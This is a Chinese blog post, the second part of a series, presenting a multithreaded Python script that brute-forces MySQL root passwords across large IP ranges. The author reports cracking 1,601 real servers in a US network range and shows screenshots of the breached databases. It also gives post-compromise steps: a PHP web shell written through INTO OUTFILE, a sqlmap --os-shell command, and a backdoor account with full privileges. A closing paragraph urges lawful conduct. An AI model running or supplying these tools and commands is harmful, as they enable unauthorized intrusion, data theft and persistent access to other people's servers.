原创： blus  合天智汇

接着上篇《[高效python脚本，6小时获取上千台mysql数据库服务器（上）](http://mp.weixin.qq.com/s?__biz=MjM5MTYxNjQxOA==&mid=2652849583&idx=1&sn=988f46d56142b7503312aa10b231146f&chksm=bd5939628a2eb074a718bf3c196098d8e108edf4a5b056da1dccbdcc47d96435cd292ed10cf5&scene=21#wechat_redirect)》，现在接着来看后续的。

08继续提高效率

 **反思：**

在之前测试中，发现有好些的主机在线却ping不通，现在的服务器为了避免恶意的网络攻击，一会拒绝用户Ping服务器。而且调用系统命令行来ping主机是否存活这步骤也很消耗性能，无法设置较高的线程，只能维持在几百。

 **改进：**

于是直接删去ping功能，直接调用mysql函数连接3306端口，通过设置join()的超时设置来判断端口是否开放。因为一般情况下，若mysql服务端口3306端口不开放，返回不能连接的错误需要6~8秒左右，但若该端口开放，1秒便能回应。因此设置join（3），若3秒内无回应，则默认端口关闭，销毁该线程。这样改进以后，线程能开到10000左右，效率翻倍提高，代码也更加简洁。

以下是此次的代码-5：

#!/usr/bin/envpython

#coding=utf-8

#author:Blus

importMySQLdb

importthreading

importtime

importIPy

defMySQLdb_connect(ip, mysql_password,event):

event1=event

try:

event1.clear()

MySQLdb.connect(ip,mysql_user, mysql_password, '' , 3306)

event1.clear()

print ip + ":"+ mysql_password + " connected"

ip_log('port_connected.txt',ip, mysql_password)

except Exception,e:

e = str(e)

#print e

if (e.find('Accessdenied') != -1):

#端口开放，但密码错误，记录并继续下面的爆破代码

event1.set() #设置爆破标志

print ip + ":"+ mysql_password + " 密码错误"

#ip_log('port_opend.txt',ip, "密码错误")

pass

elif (e.find('manyconnections') != -1):

# 连接过多,暂停1秒

time.sleep(1)

event1.set()

pass

elif (e.find('Can\'tconnect') != -1):

# 端口未开放,退出

event1.clear()

else:

# 其他错误，记录并退出

event1.clear()

ip_log('port_opend.txt',ip, e)

return

#爆破函数

defmysql_connect2(ip):

# 先尝试空密码连接threading.Event()

event1 = threading.Event()

t2 =threading.Thread(target=MySQLdb_connect, args=(ip, '',event1))

t2.start()

t2.join(3) #3秒超时

if not event1.isSet():

#未设置标识则退出

return

ip_log('port_opend.txt', ip,"密码错误")

# 开始爆破

fp_mp =open('mysql_password.txt', 'r')

for mysql_password infp_mp.readlines():

#event2 =threading.Event()

mysql_password =mysql_password.replace('\r', "").replace('\n', "")

t2 =threading.Thread(target=MySQLdb_connect, args=(ip, mysql_password,event1))

t2.start()

t2.join(5) # 秒超时

if not event1.isSet():

# 未设置标识则退出,不然就继续爆破

fp_mp.close()

return

fp_mp.close()

return

defip_log(txt_name,ip,content):

f1 = open(txt_name, 'a')

f1.write(ip + ":"+ content + "\r\n")

f1.close()

if__name__ == "__main__":

mysql_user='root'

#设置同时运行的线程数

threads=10000

ip1 = IPy.IP('127.0.0.1')

for ip in ip1:

ip=str(ip)

#print ip

#限制线程数

while(threading.activeCount() > threads):

time.sleep(1)

t1 =threading.Thread(target=mysql_connect2, args=(ip,))

t1.start()

#当线程只剩1时，说明执行完了

while(threading.activeCount()!=1):

time.sleep(1)

print "检测结束"

09优化、修补

实际测试中发现了一些报错。

报错一：

![图片.png](https://image.3001.net/images/20181227/1545893022_5c24749e603c7.png!small)  

当同时对大量在线的mysql服务器进行密码爆破时，同时不断的读取字典文件可能会报错。于是直接改成了将字典文件读进列表，以后的每次密码爆破都只是在遍历密码列表。另外有一个注意点，Linux是有文件句柄限制的（openfiles），一般最大数为1024。出现其他情况的“Toomant
opeb file”报错，也可以用这个命令ulimit-n 102400，增大打开文件数来解决。

创建密码列表：

  
![图片.png](https://image.3001.net/images/20181227/1545893029_5c2474a5564e0.png!small)  

循环读取列表

![图片.png](https://image.3001.net/images/20181227/1545893035_5c2474aba0455.png!small)  

为了防止意外发生写文件错误，也给它加了层“防护衣”：

![图片.png](https://image.3001.net/images/20181227/1545893041_5c2474b1d7cfb.png!small)  

报错信息二：

  
![图片.png](https://image.3001.net/images/20181227/1545893050_5c2474bab99cc.png!small)  

之前没有考虑这个问题，实际测试中也蛮多的，发生在网站状态不稳定的情况下。

没什么好说的，错误信息判断里面补上.在错误信息判断里面补上，网络不好就暂停一会儿。

![图片.png](https://image.3001.net/images/20181227/1545893057_5c2474c1337bd.png!small)  

以下是本次的完整代码-6：

#!/usr/bin/envpython

#coding=utf-8

#author:Blus

importMySQLdb

importthreading

importtime

importIPy

defMySQLdb_connect(ip, mysql_password,event):

event1=event

try:

event1.clear()

MySQLdb.connect(ip,mysql_user, mysql_password, '' , 3306)

event1.clear()

print ip + ":"+ mysql_password + " connected"

ip_log('port_connected.txt',ip, mysql_password)

except Exception,e:

e = str(e)

#print e

if (e.find('Accessdenied') != -1):

#端口开放，但密码错误，记录并继续下面的爆破代码

event1.set() #设置爆破标志

#print ip + ":"+ mysql_password + " 密码错误"

#ip_log('port_opend.txt',ip, "密码错误")

pass

elif (e.find('manyconnections') != -1):

# 连接过多,暂停1秒

time.sleep(1)

event1.set()

pass

elif (e.find('Can\'tconnect') != -1):

# 端口未开放,退出

event1.clear()

else:

# 其他错误，记录并退出

event1.clear()

ip_log('port_opend.txt',ip, e)

return

#爆破函数

defmysql_connect2(ip):

# 先尝试空密码连接threading.Event()

event1 = threading.Event()

t2 =threading.Thread(target=MySQLdb_connect, args=(ip, '',event1))

t2.start()

t2.join(3) #3秒超时

if not event1.isSet():

#未设置标识则退出

return

ip_log('port_opend.txt', ip,"密码错误")

# 开始爆破

global list_password

for mysql_password inlist_password:

mysql_password =mysql_password.replace('\r', "").replace('\n', "")

t2 =threading.Thread(target=MySQLdb_connect, args=(ip, mysql_password,event1))

t2.start()

t2.join(5) # 秒超时

if not event1.isSet():

# 未设置标识则退出,不然就继续爆破

fp_mp.close()

return

return

defip_log(txt_name,ip,content):

try:

f1 = open(txt_name, 'a')

f1.write(ip + ":"+ content + "\r\n")

f1.close()

except Exception, e:

print str(e)

pass

if__name__ == "__main__":

#设置数据库用户名

mysql_user='root'

#设置同时运行的线程数

threads=10000

#指定IP网段

ip1 =IPy.IP('192.168.50.1/32')

#将密码字典读进列表

list_password= []

fp_mp =open('mysql_password.txt', 'r')

for password infp_mp.readlines():

list_password.append(password)

for ip in ip1:

ip=str(ip)

#限制同时运行的线程数

while(threading.activeCount() > threads):

time.sleep(1)

t1 =threading.Thread(target=mysql_connect2, args=(ip,))

t1.start()

while(threading.activeCount()!=1):

# 当线程只剩1时，说明执行完了

time.sleep(1)

print "检测结束"

10获取数据库服务器权限

至此，MySql工具基本升级完成，本来还应该加上相关的自动攻击代码，但发现目前网上还存在大量弱口令连接的数据库服务器，而且数据库服务器重要的是数据，其数据比一台服务器的权限更宝贵。因此，在这就只是简单和大家探讨几种常见的Mysql攻击手段。

1.system函数调用系统命令

在MySQL5.x中增加了system命令，简单的符号是\\!，从而使MySQL可以执行系统的命令。例如systemifconfig或者\\!ifconfig。

当然不一定会开启这个函数，可以在mysql命令行下输入help，来查看是否存在system函数，若有则能使用该函数。

2\. outfile写小马

只限于站库未分离的服务器，写在数据库的字段中写入小马内容，再利用outfile导出成一个小马，放置于web目录下。基本命令如下：

createdatabase A123456666;

useA123456666;

CREATETABLE A123456666.B123456 (C123456 TEXT NOT NULL );

INSERTINTO B123456 (C123456)VALUES ('111');

SELECTC123456 from B123456 into outfile '网站路径/shell.php';

dropdatabase A123456666；

也可以简化为：

SELECT'<?php @eval($_POST[cmd]); ?>' into outfile '/var/www/html/shell.php';

3.另外还有udf、mof提权，以及msf、sqlmap自动工具之类的

举例： sqlmap.py-d "mysql://root:1234@192.168.1.1:3306/databasename" --os-shell

哪怕无法获得整台服务器的权限，但只要能一直维持对数据库的访问也是极好的。

服务器的数据库密码很可能会被更改，因此在获得数据库的密码后，立刻创建一个新账户还是比较重要的。可以紧接着执行如下命令：

CREATEUSER 'big'@'%' IDENTIFIED BY '123456'; 创建用户名为big，密码为123456的用户

GRANTALL PRIVILEGES ON *.* TO 'big'@'%' IDENTIFIED BY '123456'; 授权

flushprivilege; 刷新权限

 **十、测试分析结果**

是骡是马得拉出来溜溜，选了个明媚的中文，开了主机运行脚本，每台一万个线程，跑了大半天米国的某X.0.0.0/8网段。本不抱什么希望，最后结果却出人意料。

共计255x255x255=16581375个IP，其中有44979个mysql服务器在线，其中4,776个只允许指定的ip连接，553个端口报错，37450个端口可正常连接。在可正常连接的37450端口中，爆破密码成功连接的有1601个，真可谓是“万里挑一”。

  
![图片.png](https://image.3001.net/images/20181227/1545893073_5c2474d1e1645.png!small)  

  
![图片.png](https://image.3001.net/images/20181227/1545893079_5c2474d7509b3.png!small)  

  
![图片.png](https://image.3001.net/images/20181227/1545893085_5c2474dd4ac29.png!small)  

下面附上部分截图：

爆破成功的记录

![图片.png](https://image.3001.net/images/20181227/1545893091_5c2474e3013c8.png!small)  

测试中出现过的报错情况：

  
![图片.png](https://image.3001.net/images/20181227/1545893103_5c2474ef21c39.png!small)  

数据库截图，虽然是美国的网段，但发现也有其他国家地区部署的数据库，包括中国。

![图片.png](https://image.3001.net/images/20181227/1545893109_5c2474f5f1705.png!small)

![图片.png](https://image.3001.net/images/20181227/1545893114_5c2474faea2c6.png!small)

  

  
![图片.png](https://image.3001.net/images/20181227/1545893119_5c2474ff7fb61.png!small)  

  
![图片.png](https://image.3001.net/images/20181227/1545893126_5c24750666374.png!small)  

  
![图片.png](https://image.3001.net/images/20181227/1545893133_5c24750d05f73.png!small)  

发现一些已经被黑客攻击的网站，数据库被删除，只留下WARNING-Readme。受害者只有向黑客支付比特币才能恢复数据。国内一般都是直接脱库、分类、汇总，然后卖数据。

![图片.png](https://image.3001.net/images/20181227/1545893142_5c247516ca1e0.png!small)

![图片.png](https://image.3001.net/images/20181227/1545893147_5c24751be249f.png!small)

  

 **勒索信息：**

“Your Database isdownloaded and backed up on our secured servers. To recover
your lostdata: Send 0.6 BTC to our BitCoin Address and Contact us by eMailwith
your server IP Address and a Proof of Payment. Any eMail withoutyour server IP
Address and a Proof of Payment together will beignored. We will drop the
backup after 24 hours. You are welcome!.”

11结语

可能有人会说，不就是个批量爆破工具吗。但我并不只是想分享一个工具，同时也是把这个脚本诞生的过程一步一步的展现出来，便于大家探讨学习。不只是单纯的用工具，更是要学会工具背后的原理及其意义。另外就是与大家分享一下安全现状，如果只是自己在扫，也不一定有耐心能扫出这么多带漏洞的服务器，我在扫的时候，有时候连扫几十个网段都不见得有一台mysql服务器。
这次扫描的X.0.0.0
-X.127.0.0网段只扫出来50台MySql服务器。而X.128.0.0-X.255.0.0却有上万台。可能是因为很多云服务器厂家，包括大型企事业单位，他们服务器的ip都是“扎堆”在一起的吧。因此网段选得好，也能影响最后的结果。这需要“手气”，同时也需要耐心。在爆破密码的时候更需要一个精巧的字典，在精不在多，本人使用的字典只有5kb，但却包含了许多的高频弱口令。每年都会有TOP100的弱口令报告出来，要注意收集。国外的安全情况如此，国内的安全情况也不容乐观，我们储存在网上的个人信息和数据很容易就会被不法分子窃取。作为网络安全从业者的我们，应该积极响应国家号召，在自己的岗位上尽心尽力，遵守国家的法律。不去做危害计算机安全的事，哪怕是国外的服务器。每年都有入狱的“黑客”，望大家引以为戒。也希望能大家一起学习成长，有兴趣的大佬可以加我的微信jjinchengg,谢谢。

上述所有脚本已打包：

https://pan.baidu.com/s/12skXEu2wLP0W_0LSYMZ0eQ

提取码：jy0h

压缩包密码是：blusblus

